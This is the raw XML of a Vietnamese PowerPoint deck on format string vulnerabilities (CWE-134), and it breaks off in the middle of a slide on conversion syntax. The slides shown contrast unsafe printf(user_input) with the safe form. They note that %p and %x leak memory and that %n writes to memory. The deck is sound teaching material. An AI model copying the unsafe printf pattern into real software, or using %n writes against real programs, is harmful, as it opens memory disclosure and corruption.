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6.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50.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52.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide14.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide5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42.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide53.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide24.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide55.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
  <Override PartName="/ppt/slides/slide19.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54.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Lst>
  <p:sldSz cx="12188825"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4680"/>
            <a:ext cx="8221680" cy="11350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body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8221680" cy="45180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4" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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 name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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0E45AE1D-5715-4C38-8FE4-7765BFBCA97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722160" y="4406760"/>
            <a:ext cx="7764480" cy="13543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8" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722160" y="2906640"/>
            <a:ext cx="7764480" cy="149220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9" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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F7809FC-F797-4F86-BD32-442480AF16B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1680" cy="11350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3" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="4030560" cy="45180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4" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648320" y="1600200"/>
            <a:ext cx="4030560" cy="45180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5" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="7"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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6" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="8"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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 name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="9"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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F07762D3-A0A0-41EC-B57D-AAF0C071F72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1680" cy="11350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9" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1535040"/>
            <a:ext cx="4032360" cy="6318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0" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2174760"/>
            <a:ext cx="4032360" cy="39434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21" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4645080" y="1535040"/>
            <a:ext cx="4033800" cy="6318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2" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4645080" y="2174760"/>
            <a:ext cx="4033800" cy="39434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23" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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AEA1789-D42C-4B9F-8782-FCB4D046806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1680" cy="11350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dt" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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8" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="14"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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9" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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3BB2472-8780-42AE-90C0-C6CBC430943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dt" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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EDBB37BD-3098-4448-AE6A-EB1C56B03A3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3" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609120" y="273600"/>
            <a:ext cx="10962000" cy="113724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34" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609120" y="1604520"/>
            <a:ext cx="10962000" cy="396972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2880"/>
            <a:ext cx="3000240" cy="11541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36" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3575160" y="272880"/>
            <a:ext cx="5103720" cy="584532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7" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1434960"/>
            <a:ext cx="3000240" cy="46832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38" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="19"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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9" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="20"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="21"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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EC77456F-8587-4F18-A1FD-EBAFD85EB20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1792440" y="4800600"/>
            <a:ext cx="5478480" cy="5587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42" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1792440" y="612720"/>
            <a:ext cx="5478480" cy="4106880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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marL="432000" indent="-324000" algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>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indent="-324000" algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="561"/>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indent="-288000" algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="47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indent="-216000" algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>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indent="-216000" algn="l" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>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43" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1792440" y="5367240"/>
            <a:ext cx="5478480" cy="7970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44" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="22"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="23"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="24"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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18C4FE7-6F7B-4C99-B7E8-31647D877F7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685800" y="2130480"/>
            <a:ext cx="7764480" cy="14619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8" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="25"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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9" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="26"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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0" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="27"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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E89210F2-2BD7-499F-9D24-ADAFFBED4AC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4680"/>
            <a:ext cx="8221680" cy="11350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2" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600200"/>
            <a:ext cx="8221680" cy="45180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3" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="28"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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4" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="29"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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5" name="PlaceHolder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="30"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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A4B01057-4074-4DAF-8BA6-E5E29AB71A5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6629400" y="274680"/>
            <a:ext cx="2049480" cy="584352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7" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="274680"/>
            <a:ext cx="6012000" cy="584352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8" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="31"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="6356520"/>
            <a:ext cx="2125800" cy="3571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4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="32"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6356520"/>
            <a:ext cx="2887560" cy="3571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5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="33"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6553080" y="6356520"/>
            <a:ext cx="2125800" cy="3571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2DD3DD40-63C3-4710-9749-248346062BE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6.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide2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6.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6.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide3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6.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide3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6.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6.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide3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
</Relationships>
</file>

<file path=ppt/slides/_rels/slide4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xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide4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4.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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="914400"/>
            <a:ext cx="10964880" cy="759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4400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>FORMAT STRING</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="62" name=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="1965600"/>
            <a:ext cx="8076240" cy="3520440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="5857920"/>
            <a:ext cx="9779760" cy="542880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>https://github.com/hibwyli/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>another_fmt_slide_in_world</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TextBox 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10150920" cy="5468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Arial"/>
              </a:rPr>
              <a:t>CWE-134 — Use of Externally-Controlled Format String</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="TextBox 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="793080"/>
            <a:ext cx="10969560" cy="697932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US" sz="1800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>CWE-134 — Use of Externally-Controlled Format String</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Mô tả: Lỗ hổng xảy ra khi dữ liệu do người dùng hoặc nguồn bên ngoài kiểm soát được sử dụng trực tiếp làm format string trong các hàm xử lý định dạng như printf().</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Ví dụ:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Không an toàn: printf(user_input);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>An toàn: printf("%s", user_input);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Rủi ro bảo mật:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Information Disclosure: Sử dụng %p, %x để đọc và tiết lộ dữ liệu từ bộ nhớ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Memory Write: Sử dụng %n để ghi giá trị vào địa chỉ bộ nhớ, nếu các điều kiện khai thác phù hợp.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>CWE Classification: CWE-134 — Use of Externally-Controlled Format String.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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Arial"/>
              </a:rPr>
              <a:t>Lỗ hổng phát sinh khi chương trình sử dụng dữ liệu không đáng tin cậy làm format string, có thể dẫn đến rò rỉ thông tin hoặc ghi dữ liệu ngoài ý muốn vào bộ nhớ.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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Format string là gì?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="356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2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>printf là một cái MẪU CÂU có chỗ trống, rồi thế giá trị thật vào.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("Xin chào, tôi là %s, tôi %d tuổi!\n", "Nam", 19);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Xin chào, tôi là Nam, tôi 19 tuổi!</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:br>
              <a:rPr sz="2600"/>
            </a:br>
            <a:endParaRPr lang="en-US"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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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Cấu trúc một conversion</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="464760" y="1234440"/>
            <a:ext cx="10964880" cy="3180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2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>%[arg$][flags][width][.prec][size]conv</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
